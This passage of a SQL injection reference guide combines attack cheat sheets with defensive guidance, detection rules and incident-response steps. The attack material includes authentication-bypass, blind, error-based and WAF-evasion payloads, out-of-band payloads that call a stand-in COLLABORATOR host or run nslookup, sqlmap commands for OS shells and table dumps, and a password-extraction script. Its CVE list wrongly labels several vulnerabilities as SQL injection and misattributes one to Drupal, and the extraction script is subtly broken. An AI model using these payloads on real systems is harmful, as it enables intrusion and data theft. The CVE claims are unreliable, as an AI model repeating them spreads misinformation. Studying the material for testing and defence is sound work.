### Basic Injection Tests

```sql
'
"
`
')
")
`)
'))
"))
`))
' OR 1=1--
" OR 1=1--
' OR '1'='1
" OR "1"="1
admin'--
admin'#
' OR 1=1#
' OR 1=1/*
```

### Authentication Bypass

```sql
admin'--
admin'#
admin' OR '1'='1
admin' OR 1=1--
' OR '1'='1
' OR 1=1--
') OR ('1'='1
') OR (1=1--
admin') OR ('1'='1
' UNION SELECT NULL, username, password FROM users--
```

### Union-Based Extraction

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Boolean-Based Blind

```sql
' AND 1=1--
' AND 1=2--
' AND 'a'='a
' AND 'a'='b
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

### Time-Based Blind

**PostgreSQL:**
```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (LENGTH(password)>5) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='admin'--
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='admin'--
```

**MySQL:**
```sql
' AND IF(1=1,SLEEP(10),0)#
' AND IF(LENGTH(password)>5,SLEEP(10),0) FROM users WHERE username='admin'#
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(10),0) FROM users WHERE username='admin'#
```

**Microsoft SQL Server:**
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; IF (LEN(password)>5) WAITFOR DELAY '0:0:10' FROM users WHERE username='admin'--
'; IF (SUBSTRING(password,1,1)='a') WAITFOR DELAY '0:0:10' FROM users WHERE username='admin'--
```

**Oracle:**
```sql
'||(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual)||'
'||(SELECT CASE WHEN (LENGTH(password)>5) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM users WHERE username='admin')||'
```

### Error-Based Extraction

**Microsoft SQL Server:**
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))--
```

**PostgreSQL:**
```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

**MySQL:**
```sql
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1337)#
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))#
```

**Oracle:**
```sql
' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--
' AND 1=TO_NUMBER((SELECT password FROM users WHERE username='admin'))--
```

### Out-of-Band

**Oracle:**
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR/"> %remote;]>'),'/l') FROM dual--
```

**Microsoft SQL Server:**
```sql
'; exec master..xp_dirtree '//COLLABORATOR/a'--
```

**PostgreSQL:**
```sql
'; copy (SELECT '') to program 'nslookup COLLABORATOR'--
```

**MySQL:**
```sql
' UNION SELECT LOAD_FILE('\\\\COLLABORATOR\\a')--
```

### WAF Bypass Techniques

**Case Variation:**
```sql
SeLeCt * FrOm users
UnIoN SeLeCt username,password FrOm users
```

**Comment Insertion:**
```sql
SE/**/LECT * FR/**/OM users
UN/**/ION SE/**/LECT username,password FR/**/OM users
```

**Whitespace Alternatives:**
```sql
SELECT+*+FROM+users
SELECT%09*%09FROM%09users
SELECT%0a*%0afrom%0ausers
```

**URL Encoding:**
```sql
%53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20users
```

**Double URL Encoding:**
```sql
%2553%2545%254C%2545%2543%2554%2520%252A%2520%2546%2552%254F%254D%2520users
```

**Hex Encoding:**
```sql
0x53454C454354202A2046524F4D2075736572
```

**XML Entity Encoding:**
```xml
<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;</storeId>
```

---

## OWASP References

### OWASP Top 10 - A03:2021 Injection

SQL injection falls under the Injection category in OWASP Top 10 2021.

**Risk Factors:**
- Prevalence: Common
- Detectability: Easy
- Impact: Severe
- Exploitability: Easy

**CWE Mapping:**
- CWE-89: SQL Injection
- CWE-564: SQL Injection: Hibernate
- CWE-917: Expression Language Injection

### OWASP Testing Guide

**WSTG-INPV-05: Testing for SQL Injection**

**Test Objectives:**
- Identify SQL injection points
- Assess severity and impact
- Determine exploitability

**Test Methods:**
1. Detection techniques
2. Standard SQL injection techniques
3. Fingerprinting database
4. Exploitation approaches

**Tools:**
- sqlmap
- Burp Suite
- OWASP ZAP
- jSQL Injection

### OWASP SQL Injection Prevention Cheat Sheet

**Primary Defenses:**

1. **Use Prepared Statements (Parameterized Queries)**
```java
String query = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
```

2. **Use Stored Procedures (Properly)**
```sql
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username
END
```

3. **Input Validation (Whitelist)**
```python
import re
if not re.match("^[a-zA-Z0-9_]+$", username):
    raise ValueError("Invalid username")
```

4. **Escape User Input**
```python
import MySQLdb
cursor.execute("SELECT * FROM users WHERE username=%s", (username,))
```

**Additional Defenses:**
- Least privilege database accounts
- Whitelist input validation
- Encode outputs
- Use ORM frameworks properly
- Implement logging and monitoring

### OWASP ASVS (Application Security Verification Standard)

**V5.3 Output Encoding and Injection Prevention**

**Level 1:**
- V5.3.1: Output encoding for context (HTML, URL, JavaScript, CSS, SQL)
- V5.3.3: Parameterized queries, ORMs, or entity frameworks

**Level 2:**
- V5.3.4: SQL or NoSQL query uses parameterized queries, ORMs, entity frameworks, or otherwise protected from database injection attacks
- V5.3.5: WHERE and HAVING clauses not accepting concatenated input

**Level 3:**
- V5.3.8: The application protects against LDAP injection vulnerabilities, or has specific security controls to prevent LDAP injection

---

## Industry Standards & Guidelines

### NIST Guidelines

**NIST SP 800-53 Rev. 5:**
- **SI-10: Information Input Validation**
  - Validate inputs for type, length, format, and range
  - Use whitelisting over blacklisting

- **SI-11: Error Handling**
  - Prevent information leakage through error messages
  - Display generic error messages to users

**NIST SP 800-95: Guide to Secure Web Services:**
- Input validation
- SQL injection protection mechanisms
- Secure coding practices

### PCI DSS Requirements

**Requirement 6.5.1:** Address common coding vulnerabilities in software development processes:
- Injection flaws, particularly SQL injection

**Testing Procedures:**
- Validate input is rendered safe
- Use parameterized queries
- Implement input validation
- Escape special characters

### CWE/SANS Top 25

**CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')**

**Rank:** #3 in 2021 CWE Top 25

**Description:** Software constructs SQL commands using externally-influenced input but fails to neutralize special elements.

**Common Consequences:**
- Confidentiality: Read application data
- Integrity: Modify application data
- Authorization: Gain privileges

**Likelihood of Exploit:** High

### MITRE ATT&CK Framework

**Technique ID:** T1190 - Exploit Public-Facing Application

**Sub-Techniques:**
- SQL Injection exploitation
- Web application exploitation

**Detection:**
- WAF/IDS alerts for SQL injection patterns
- Database query logging
- Anomalous database behavior
- Unusual outbound connections

**Mitigation:**
- Application isolation
- Input validation
- Parameterized queries
- Least privilege

---

## CVE Examples & Case Studies

### Notable SQL Injection CVEs

**CVE-2021-22005 - VMware vCenter Server**
- CVSS: 9.8 (Critical)
- Impact: Remote code execution via SQL injection
- Affected: vCenter Server versions 6.5, 6.7, 7.0
- Exploitation: Unauthenticated attacker could execute arbitrary code

**CVE-2020-28458 - Drupal Core**
- CVSS: 8.8 (High)
- Impact: SQL injection in database API
- Affected: Drupal 9.0.x, 8.9.x, 8.8.x, 7.x
- Exploitation: Authenticated users could execute arbitrary SQL

**CVE-2019-0193 - Apache Solr**
- CVSS: 9.8 (Critical)
- Impact: Remote code execution via SQL injection
- Affected: Apache Solr versions before 8.2.0
- Exploitation: DataImportHandler enabled by default with SQL injection

**CVE-2018-15133 - Laravel Framework**
- CVSS: 8.1 (High)
- Impact: SQL injection via column name
- Affected: Laravel 5.5.x, 5.6.x
- Exploitation: ORDER BY clause injection

**CVE-2017-5638 - Apache Struts**
- CVSS: 10.0 (Critical)
- Impact: Remote code execution (not direct SQLi but led to database access)
- Affected: Apache Struts 2.3.x, 2.5.x
- Notable: Equifax breach exploited this vulnerability

### Real-World Breaches

**Heartland Payment Systems (2008)**
- **Impact:** 130 million credit cards compromised
- **Method:** SQL injection to install malware
- **Cost:** $140 million in settlements

**TJX Companies (2007)**
- **Impact:** 94 million customer records
- **Method:** SQL injection combined with WiFi exploitation
- **Cost:** $256 million in costs and settlements

**Sony Pictures (2011)**
- **Impact:** 1 million user accounts
- **Method:** SQL injection vulnerability in web application
- **Cost:** $171 million in costs

**RockYou (2009)**
- **Impact:** 32 million plaintext passwords
- **Method:** SQL injection in web application
- **Cost:** $250,000 settlement + reputation damage

### Modern Attack Trends (2020-2024)

**Automated Scanning:**
- Bots scan for SQLi vulnerabilities 24/7
- Target outdated CMS, plugins, frameworks
- Average time from disclosure to exploitation: 15 days

**Cryptojacking:**
- SQL injection to deploy cryptocurrency miners
- Database servers used for mining operations
- Difficult to detect due to low-and-slow approach

**Ransomware:**
- SQL injection as initial access vector
- Database encryption with ransom demands
- Average ransom: $200,000-$2,000,000

**Supply Chain Attacks:**
- Compromise third-party components
- Inject malicious code through vulnerable dependencies
- Affects multiple downstream organizations

---

## Tools & Frameworks

### Automated SQL Injection Tools

**sqlmap**
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# With authentication
sqlmap -u "http://target.com/page" --cookie="session=xyz123"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Batch mode (non-interactive)
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=MySQL

# Use Tor for anonymity
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

**jSQL Injection**
- GUI-based SQL injection tool
- Supports multiple databases
- Cross-platform (Java)
- Features: automatic injection, database fingerprinting, file reading

**NoSQLMap**
- NoSQL injection testing
- MongoDB, CouchDB, etc.
- Python-based

### Manual Testing Tools

**Burp Suite**
- Professional penetration testing platform
- Proxy, Repeater, Intruder, Collaborator
- Extensive extension ecosystem

**OWASP ZAP**
- Free, open-source web app scanner
- Automated and manual testing
- Active community support

**Postman**
- API testing platform
- Manual payload crafting
- Request collection management

### Browser Extensions

**HackBar**
- SQL injection payload insertion
- Encoding/decoding utilities
- Quick testing interface

**Cookie Editor**
- Modify cookies easily
- Test cookie-based SQL injection
- Available for Chrome, Firefox

**Wappalyzer**
- Identify technologies used
- Determine database type
- CMS and framework detection

### Defensive Tools

**Web Application Firewalls (WAF):**
- **ModSecurity:** Open-source WAF engine
- **AWS WAF:** Cloud-based protection
- **Cloudflare WAF:** DDoS + injection protection
- **Imperva WAF:** Enterprise-grade protection

**Static Application Security Testing (SAST):**
- **SonarQube:** Code quality and security
- **Checkmarx:** Enterprise SAST solution
- **Veracode:** Cloud-based SAST
- **Fortify:** Micro Focus security testing

**Dynamic Application Security Testing (DAST):**
- **Acunetix:** Automated vulnerability scanner
- **Netsparker:** Automated DAST with proof of exploit
- **AppSpider:** DAST from Rapid7
- **Qualys WAS:** Cloud-based web app scanning

**Database Activity Monitoring (DAM):**
- **Imperva DAM:** Monitor and block SQL injection
- **IBM Guardium:** Database security and compliance
- **Oracle Database Firewall:** Real-time SQL monitoring
- **McAfee Database Security:** Vulnerability assessment + monitoring

---

## Secure Coding Best Practices

### Use Parameterized Queries

**Java (JDBC):**
```java
String sql = "SELECT * FROM users WHERE username=? AND password=?";
PreparedStatement statement = connection.prepareStatement(sql);
statement.setString(1, username);
statement.setString(2, password);
ResultSet results = statement.executeQuery();
```

**Python (psycopg2):**
```python
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (username, password))
```

**PHP (PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=:username AND password=:password");
$stmt->execute(['username' => $username, 'password' => $password]);
```

**C# (.NET):**
```csharp
string sql = "SELECT * FROM users WHERE username=@username AND password=@password";
SqlCommand command = new SqlCommand(sql, connection);
command.Parameters.AddWithValue("@username", username);
command.Parameters.AddWithValue("@password", password);
SqlDataReader reader = command.ExecuteReader();
```

**Node.js (MySQL):**
```javascript
connection.query("SELECT * FROM users WHERE username=? AND password=?", [username, password], (error, results) => {
    // Handle results
});
```

### Use ORM Frameworks Safely

**Hibernate (Java):**
```java
// Safe
Query query = session.createQuery("FROM User WHERE username=:username");
query.setParameter("username", username);

// Unsafe
Query query = session.createQuery("FROM User WHERE username='" + username + "'");
```

**SQLAlchemy (Python):**
```python
# Safe
session.query(User).filter(User.username == username).first()

# Unsafe
session.query(User).filter("username = '%s'" % username).first()
```

**Entity Framework (C#):**
```csharp
// Safe
var user = context.Users.Where(u => u.Username == username).FirstOrDefault();

// Unsafe
var user = context.Users.SqlQuery("SELECT * FROM Users WHERE Username = '" + username + "'").FirstOrDefault();
```

**Sequelize (Node.js):**
```javascript
// Safe
User.findOne({ where: { username: username } });

// Unsafe
sequelize.query("SELECT * FROM users WHERE username = '" + username + "'");
```

### Input Validation

**Whitelist Validation:**
```python
import re

# Allow only alphanumeric and underscore
def validate_username(username):
    if not re.match("^[a-zA-Z0-9_]{3,20}$", username):
        raise ValueError("Invalid username")
    return username

# Allow only integers
def validate_id(id_param):
    try:
        return int(id_param)
    except ValueError:
        raise ValueError("Invalid ID")
```

**Type Enforcement:**
```typescript
// TypeScript example
interface UserQuery {
    id: number;
    username: string;
    age: number;
}

function getUserById(userId: number): Promise<User> {
    // TypeScript enforces type, preventing string injection
    return db.query("SELECT * FROM users WHERE id = $1", [userId]);
}
```

### Least Privilege Principle

**Database User Permissions:**
```sql
-- Create read-only user for web application
CREATE USER webapp_user WITH PASSWORD 'strong_password';
GRANT SELECT ON users TO webapp_user;
GRANT SELECT, INSERT, UPDATE ON posts TO webapp_user;

-- Deny dangerous operations
REVOKE DELETE ON users FROM webapp_user;
REVOKE DROP ON ALL TABLES FROM webapp_user;

-- Admin operations use separate, highly restricted account
CREATE USER admin_user WITH PASSWORD 'even_stronger_password';
GRANT ALL PRIVILEGES ON DATABASE mydb TO admin_user;
```

### Error Handling

**Don't Expose Database Errors:**
```python
# Bad
try:
    cursor.execute(query)
except Exception as e:
    return f"Database error: {str(e)}"  # Leaks information!

# Good
try:
    cursor.execute(query)
except Exception as e:
    logger.error(f"Database error: {str(e)}")  # Log internally
    return "An error occurred. Please try again."  # Generic message
```

### Escaping (Last Resort)

**When Parameterization Impossible:**
```python
import psycopg2.extensions

# PostgreSQL example
def escape_string(input_string):
    return psycopg2.extensions.adapt(input_string).getquoted().decode('utf-8')

# Still prefer parameterized queries!
```

**Note:** Escaping should be a last resort. Parameterized queries are always preferred.

### Regular Security Audits

**Code Review Checklist:**
- [ ] All database queries use parameterized statements
- [ ] No string concatenation in SQL queries
- [ ] Input validation on all user inputs
- [ ] Error messages don't leak information
- [ ] Database users follow least privilege
- [ ] ORM usage follows security best practices
- [ ] Third-party dependencies up to date
- [ ] WAF configured and monitoring
- [ ] Logging captures suspicious activity

---

## Detection & Monitoring

### Log Analysis

**Suspicious Patterns:**
```
# Common SQL injection strings in logs
SELECT * FROM logs WHERE request LIKE '%UNION SELECT%'
SELECT * FROM logs WHERE request LIKE '%' OR '1'='1%'
SELECT * FROM logs WHERE request LIKE '%WAITFOR DELAY%'
SELECT * FROM logs WHERE request LIKE '%pg_sleep%'
SELECT * FROM logs WHERE request LIKE '%information_schema%'
```

**Web Server Logs (Apache/Nginx):**
```
# Look for encoded SQL keywords
grep -E "(%27|%23|%2D%2D|%3B)" /var/log/apache2/access.log

# Look for UNION keyword
grep -i "union" /var/log/nginx/access.log

# Look for SQL comment syntax
grep -E "(-{2}|#|/\*)" /var/log/apache2/access.log
```

**Database Logs:**
```sql
-- PostgreSQL: Enable query logging
ALTER SYSTEM SET log_statement = 'all';
SELECT pg_reload_conf();

-- MySQL: Enable general query log
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'TABLE';

-- Look for suspicious queries
SELECT * FROM mysql.general_log WHERE argument LIKE '%UNION%' OR argument LIKE '%information_schema%';
```

### WAF Rules

**ModSecurity Core Rule Set (CRS):**
```
# SQL Injection attacks
SecRule ARGS "@detectSQLi" \
    "id:942100,\
    phase:2,\
    block,\
    capture,\
    t:none,t:urlDecodeUni,\
    msg:'SQL Injection Attack Detected via libinjection',\
    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli',\
    tag:'paranoia-level/1',\
    tag:'OWASP_CRS',\
    tag:'OWASP_CRS/WEB_ATTACK/SQL_INJECTION',\
    tag:'WASCTC/WASC-19',\
    tag:'OWASP_TOP_10/A1',\
    tag:'OWASP_AppSensor/CIE1',\
    tag:'PCI/6.5.2',\
    ver:'OWASP_CRS/3.3.0',\
    severity:'CRITICAL',\
    setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\
    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
```

### SIEM Correlation Rules

**Splunk Detection:**
```spl
index=web_logs
    (uri="*union*" OR uri="*select*" OR uri="*information_schema*" OR uri="*' OR '1'='1*")
| stats count by src_ip, uri
| where count > 5
| sort -count
```

**ELK Stack (Elasticsearch Query):**
```json
{
  "query": {
    "bool": {
      "should": [
        {"wildcard": {"request.uri": "*union*"}},
        {"wildcard": {"request.uri": "*select*"}},
        {"wildcard": {"request.uri": "*' OR '1'='1*"}},
        {"wildcard": {"request.uri": "*information_schema*"}}
      ],
      "minimum_should_match": 1
    }
  }
}
```

### Intrusion Detection Signatures

**Snort Rules:**
```
# Detect SQL injection attempts
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection - UNION SELECT"; flow:to_server,established; content:"union"; nocase; content:"select"; nocase; distance:0; classtype:web-application-attack; sid:1000001; rev:1;)

alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection - OR 1=1"; flow:to_server,established; content:"or"; nocase; content:"1=1"; nocase; distance:0; classtype:web-application-attack; sid:1000002; rev:1;)

alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection - information_schema"; flow:to_server,established; content:"information_schema"; nocase; classtype:web-application-attack; sid:1000003; rev:1;)
```

**Suricata Rules:**
```
alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:"SQL Injection - UNION Attack"; flow:established,to_server; content:"POST"; http_method; content:"union"; nocase; http_client_body; content:"select"; nocase; http_client_body; classtype:web-application-attack; sid:2000001; rev:1;)
```

### Anomaly Detection

**Behavioral Indicators:**
- Unusual query patterns from application users
- Increased database CPU/memory usage
- Slow query execution times
- Multiple failed authentication attempts
- Unexpected data exfiltration volumes
- Database connections from unusual source IPs
- Off-hours database activity

**Machine Learning Approaches:**
- Train models on normal query patterns
- Detect deviations from baseline behavior
- Identify unusual query structure or length
- Flag rapid sequential queries
- Detect data access anomalies

---

## Remediation Strategies

### Immediate Response (Incident Detected)

**Phase 1: Containment (0-1 hour)**
1. **Isolate Affected Systems:**
   ```bash
   # Block malicious IP at firewall
   iptables -A INPUT -s [ATTACKER_IP] -j DROP

   # Disable vulnerable endpoint
   # (Update web server config or application route)
   ```

2. **Enable Enhanced Logging:**
   ```sql
   -- PostgreSQL
   ALTER SYSTEM SET log_statement = 'all';
   SELECT pg_reload_conf();

   -- MySQL
   SET GLOBAL general_log = 'ON';
   ```

3. **Preserve Evidence:**
   ```bash
   # Capture relevant logs
   cp /var/log/apache2/access.log /incident/evidence/
   cp /var/log/postgresql/postgresql.log /incident/evidence/

   # Capture database state
   pg_dump database_name > /incident/evidence/db_backup.sql
   ```

**Phase 2: Eradication (1-4 hours)**
1. **Patch Vulnerable Code:**
   - Replace string concatenation with parameterized queries
   - Deploy emergency patch to production
   - Test thoroughly in staging first

2. **Reset Compromised Credentials:**
   ```sql
   -- Force password reset for all users
   UPDATE users SET password_reset_required = TRUE;

   -- Revoke all active sessions
   DELETE FROM sessions;
   ```

3. **Remove Malicious Artifacts:**
   ```sql
   -- Check for injected admin accounts
   SELECT * FROM users WHERE created_at > 'INCIDENT_START_TIME';

   -- Remove malicious accounts
   DELETE FROM users WHERE username = 'malicious_user';

   -- Check for backdoors (stored procedures, triggers)
   SELECT * FROM information_schema.routines;
   SELECT * FROM information_schema.triggers;
   ```

**Phase 3: Recovery (4-24 hours)**
1. **Restore from Clean Backup (if necessary):**
   ```bash
   # PostgreSQL restore
   pg_restore -d database_name backup_file.dump

   # MySQL restore
   mysql database_name < backup_file.sql
   ```

2. **Verify Integrity:**
   ```sql
   -- Check for data modifications
   SELECT table_name, pg_size_pretty(pg_total_relation_size(table_name::regclass))
   FROM information_schema.tables
   WHERE table_schema = 'public'
   ORDER BY pg_total_relation_size(table_name::regclass) DESC;

   -- Verify critical records
   SELECT COUNT(*) FROM users;
   SELECT COUNT(*) FROM transactions;
   ```

3. **Re-enable Services:**
   - Gradually restore service access
   - Monitor closely for re-infection
   - Implement additional security controls

**Phase 4: Post-Incident (24+ hours)**
1. **Root Cause Analysis:**
   - Identify initial infection vector
   - Determine scope of compromise
   - Document timeline of events

2. **Remediation Report:**
   - Executive summary
   - Technical details
   - Lessons learned
   - Recommendations

3. **Implement Preventive Controls:**
   - Code review all database queries
   - Deploy WAF rules
   - Enhance monitoring
   - Security awareness training

### Long-Term Prevention

**Secure SDLC Integration:**
1. **Requirements Phase:**
   - Define security requirements
   - Specify input validation rules

2. **Design Phase:**
   - Use parameterized queries by default
   - Design database access layer with security

3. **Implementation Phase:**
   - Secure coding standards
   - Peer code reviews
   - SAST tool integration

4. **Testing Phase:**
   - DAST scanning
   - Penetration testing
   - SQL injection specific tests

5. **Deployment Phase:**
   - WAF deployment
   - Database firewall configuration
   - Monitoring setup

6. **Maintenance Phase:**
   - Regular security updates
   - Continuous monitoring
   - Periodic security assessments

**DevSecOps Integration:**
```yaml
# Example CI/CD pipeline with security gates
stages:
  - build
  - sast
  - test
  - dast
  - deploy

sast_scan:
  stage: sast
  script:
    - semgrep --config=auto .
    - sonarqube-scanner
  allow_failure: false

dast_scan:
  stage: dast
  script:
    - zap-baseline.py -t https://staging.example.com
    - sqlmap -u "https://staging.example.com/*" --crawl=2 --batch
  allow_failure: false
```

---

## Advanced Topics

### Second-Order SQL Injection

**Concept:** Malicious input stored in database, later retrieved and used in unsafe query.

**Example Scenario:**

**Phase 1 - Registration (input stored):**
```python
username = "admin'--"
password = "password123"

# Safely stored in database
cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
```

**Phase 2 - Profile Update (unsafe retrieval and use):**
```python
# Retrieve stored username
cursor.execute("SELECT username FROM users WHERE id=?", (user_id,))
username = cursor.fetchone()[0]  # Returns: admin'--

# Unsafe usage in another query
query = f"UPDATE profiles SET bio='New bio' WHERE username='{username}'"
cursor.execute(query)  # Breaks query!

# Resulting SQL:
# UPDATE profiles SET bio='New bio' WHERE username='admin'--'
```

**Prevention:**
- Treat ALL data as untrusted, even from database
- Use parameterized queries for data retrieval too
- Validate and sanitize on output

### Polyglot SQL Injection

**Definition:** Single payload exploits multiple contexts (SQL, JavaScript, HTML, etc.)

**Example:**
```
1';alert(String.fromCharCode(88,83,83))//';--
```

Exploits:
- SQL injection (via `;--`)
- XSS (via `alert()`)
- Comment syntax (via `//`)

**Defense:** Context-specific encoding at every boundary

### SQL Injection in NoSQL Databases

**MongoDB Injection Example:**

**Vulnerable Code:**
```javascript
db.users.find({ username: req.body.username, password: req.body.password });
```

**Payload:**
```json
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

**Result:** Returns all users (bypasses authentication)

**Prevention:**
```javascript
// Validate input types
if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
    return res.status(400).send('Invalid input');
}

// Use parameterized queries
db.users.findOne({ username: req.body.username, password: req.body.password });
```

### Exploiting Stored Procedures

**Vulnerable Stored Procedure:**
```sql
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
BEGIN
    EXEC('SELECT * FROM users WHERE username = ''' + @username + '''')
END
```

**Exploitation:**
```sql
EXEC GetUser @username = '''; DROP TABLE users--'
```

**Secure Version:**
```sql
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username
END
```

### Time-Based Blind SQL Injection Optimization

**Binary Search Approach:**

Instead of testing each character sequentially (a-z, 0-9), use binary search:

```python
import requests
import string

def binary_search_char(url, position):
    chars = string.ascii_lowercase + string.digits
    left, right = 0, len(chars) - 1

    while left <= right:
        mid = (left + right) // 2
        test_char = chars[mid]

        payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')>'{test_char}"

        start = time.time()
        requests.get(url, params={'id': payload})
        elapsed = time.time() - start

        if elapsed > 5:  # Delay detected
            left = mid + 1
        else:
            right = mid - 1

    return chars[left]
```

**Efficiency:**
- Sequential: 36 requests per character (worst case)
- Binary search: ~6 requests per character

### SQL Injection via HTTP Headers

**User-Agent Injection:**
```http
GET /page HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0' UNION SELECT null,null,version()--
```

**Referer Injection:**
```http
GET /page HTTP/1.1
Host: target.com
Referer: https://evil.com/' OR '1'='1
```

**X-Forwarded-For Injection:**
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1' UNION SELECT password FROM users--
```

**Prevention:**
- Sanitize ALL inputs, including headers
- Don't trust client-provided headers
- Use parameterized queries for header logging/processing

---

## Practice Resources

### Online Labs & Challenges

**PortSwigger Web Security Academy:**
- URL: https://portswigger.net/web-security/sql-injection
- Free, interactive SQL injection labs
- 18 labs covering all techniques
- Solutions provided

**HackTheBox:**
- URL: https://www.hackthebox.com
- Real-world vulnerable machines
- SQL injection challenges
- Community-driven

**TryHackMe:**
- URL: https://tryhackme.com
- Guided learning paths
- SQL injection rooms
- Beginner-friendly

**PentesterLab:**
- URL: https://pentesterlab.com
- White-box and black-box exercises
- Progressive difficulty
- Paid and free content

**DVWA (Damn Vulnerable Web Application):**
- URL: https://github.com/digininja/DVWA
- Self-hosted vulnerable application
- Multiple difficulty levels
- SQL injection exercises

**WebGoat:**
- URL: https://github.com/WebGoat/WebGoat
- OWASP educational platform
- Interactive lessons
- Built-in hints

**SQLi Lab:**
- URL: https://github.com/Audi-1/sqli-labs
- 75 SQL injection challenges
- Various scenarios
- Self-hosted

### Books & Publications

**"The Web Application Hacker's Handbook" by Dafydd Stuttard and Marcus Pinto**
- Comprehensive web security guide
- Detailed SQL injection coverage
- Real-world examples

**"SQL Injection Attacks and Defense" by Justin Clarke**
- Deep dive into SQL injection
- Attack techniques and prevention
- Database-specific chapters

**"The Database Hacker's Handbook" by David Litchfield**
- Database security focus
- Advanced exploitation techniques
- Multiple database platforms

**"Web Application Security" by Andrew Hoffman**
- Modern web security practices
- Secure coding guidelines
- DevSecOps integration

### Video Courses

**PortSwigger Web Security Academy (YouTube)**
- Free video walkthroughs
- Expert demonstrations
- Lab solutions

**Rana Khalil's YouTube Channel**
- PortSwigger lab walkthroughs
- Detailed explanations
- Beginner-friendly

**The Cyber Mentor**
- Practical ethical hacking
- SQL injection techniques
- Real-world pentesting

**PentesterAcademy**
- Paid courses
- Advanced topics
- Certification preparation

### Community & Forums

**Reddit:**
- r/websecurity
- r/netsec
- r/AskNetsec

**Discord:**
- TryHackMe Discord
- HackTheBox Discord
- OWASP Discord

**Stack Overflow:**
- Security tag
- Code review
- Best practices

**InfoSec Twitter:**
- Follow security researchers
- Latest vulnerabilities
- Tool announcements

---

## Ethical & Legal Considerations

### Authorization Requirements

**Always Obtain Written Permission:**
- Explicit scope definition
- Start and end dates
- Approved testing methods
- Emergency contacts

**Penetration Testing Agreement Should Include:**
- Legal safe harbor provisions
- Confidentiality agreements
- Data handling procedures
- Reporting requirements
- Liability limitations

### Legal Framework

**Computer Fraud and Abuse Act (CFAA) - USA:**
- Unauthorized access is a federal crime
- Penalties: Fines and imprisonment
- Applies to "protected computers"

**Computer Misuse Act 1990 - UK:**
- Unauthorized access to computer material
- Unauthorized modification of computer material
- Maximum penalty: 10 years imprisonment

**General Data Protection Regulation (GDPR) - EU:**
- Data breach notification requirements
- Personal data protection
- Substantial fines for violations

**Country-Specific Laws:**
- Research local legislation
- Understand jurisdiction issues
- International implications

### Responsible Disclosure

**Coordinated Vulnerability Disclosure Process:**

1. **Discovery:**
   - Document vulnerability details
   - Determine severity and impact
   - Avoid further exploitation

2. **Reporting:**
   - Contact security team (security@example.com)
